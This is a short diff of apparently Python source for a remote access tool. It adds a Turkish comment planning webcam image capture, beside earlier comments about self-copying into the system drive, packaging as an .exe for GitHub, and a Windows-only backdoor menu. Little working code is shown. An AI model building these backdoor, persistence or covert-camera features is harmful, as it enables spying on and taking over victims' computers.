@@ -39,6 +39,7 @@ xml_path="C:\RemoteAccessTool.xml"
 #XML VE YAZILIM DOSYASINI KENDISINI SISTEM SURUCUSUNUN ICINE KOPYALAMASINI SAĞLA VE YUKARIDAKI GIBI GEREKSIZ ONCEDEN TANIMLANMIŞ YOL KULLANMA.
 #YAZILIMI .exe HALINE GETIR VE GITHUBA YUKLE.
 #/bd (backdoor) tuş menüsüne ekle ve sadece windowsta çalıştığından emin ol.
+#Webcam resim yakalama ekle.
 
 try:
     hostname = socket.gethostname()
